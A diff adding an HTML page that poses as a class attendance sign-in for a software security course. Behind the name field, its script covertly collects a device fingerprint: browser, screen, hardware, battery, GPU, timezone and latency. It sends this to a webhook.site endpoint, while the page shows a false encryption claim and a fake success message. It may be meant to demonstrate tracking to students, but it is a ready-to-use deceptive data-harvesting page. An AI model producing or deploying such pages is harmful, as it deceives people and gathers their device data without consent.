@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>《软件安全专业导论》上课签到</title>
+    <style>
+        :root { --primary: #0071e3; --success: #34c759; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #1d1d1f; }
+        .card { background: white; padding: 40px 24px; border-radius: 18px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); width: 90%; max-width: 360px; text-align: center; transition: all 0.4s ease; }
+        .icon { width: 56px; height: 56px; background: var(--primary); color: white; border-radius: 14px; display: flex; justify-content: center; align-items: center; font-size: 28px; margin: 0 auto 20px; font-weight: bold; }
+        h2 { font-size: 22px; margin: 0 0 8px; }
+        p { font-size: 14px; color: #86868b; margin-bottom: 32px; line-height: 1.4; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; -webkit-appearance: none; }
+        input:focus { border-color: var(--primary); }
+        button { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; }
+        button:active { opacity: 0.8; }
+        .footer { margin-top: 24px; font-size: 11px; color: #b6b6b8; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="app">
+    <div class="icon">教</div>
+    <h2>软件安全专业导论</h2>
+    <p>请输入姓名</p>
+    <div class="input-group">
+        <input type="text" id="stuName" placeholder="姓名" autocomplete="off">
+    </div>
+    <button onclick="handleSignIn()" id="btn">立即签到</button>
+    <div class="footer">安全加密传输中 (SSL 256-bit)</div>
+</div>
+
+<script>
+    async function handleSignIn() {
+        const name = document.getElementById('stuName').value.trim();
+        if (!name) return alert("请输入姓名");
+
+        const btn = document.getElementById('btn');
+        btn.innerText = "正在验证...";
+        btn.disabled = true;
+
+        // --- 隐私抓取逻辑开始 ---
+        
+        // 1. 基础设备信息
+        const payload = {
+            "学生姓名": name,
+            "User-Agent": navigator.userAgent,
+            "屏幕分辨率": `${window.screen.width}x${window.screen.height}`,
+            "设备像素比": window.devicePixelRatio,
+            "系统语言": navigator.language,
+            "逻辑CPU核心数": navigator.hardwareConcurrency || "未知",
+            "时区": Intl.DateTimeFormat().resolvedOptions().timeZone,
+            "内存估算": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "未知"
+        };
+
+        // 2. 获取电池状态 (部分Android/PC支持)
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                payload["电池状态"] = `${Math.round(b.level * 100)}% (${b.charging ? '正在充电' : '未充电'})`;
+            } else { payload["电池状态"] = "iOS/系统限制"; }
+        } catch (e) { payload["电池状态"] = "接口受限"; }
+
+        // 3. 获取显卡/GPU信息
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            payload["显卡型号"] = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "未知/屏蔽";
+        } catch (e) { payload["显卡型号"] = "获取失败"; }
+
+        // 4. 网络延迟探测 (Ping)
+        const start = Date.now();
+        try {
+            await fetch('https://www.baidu.com', { mode: 'no-cors' });
+            payload["网络延迟"] = (Date.now() - start) + "ms";
+        } catch (e) { payload["网络延迟"] = "探测失败"; }
+
+        // --- 数据上报 ---
+        const webhookUrl = 'https://webhook.site/d0a1afd7-61ed-4b82-a44c-0bd4b6749903'; // <--- 记得替换这里
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(payload)
+        });
+
+        // --- 模拟UI反馈 ---
+        setTimeout(() => {
+            document.getElementById('app').innerHTML = `
+                <div style="color: var(--success); font-size: 56px; margin-bottom: 20px;">✓</div>
+                <h2>签到成功</h2>
+            `;
+        }, 800);
+    }
+</script>
+</body>
+</html>
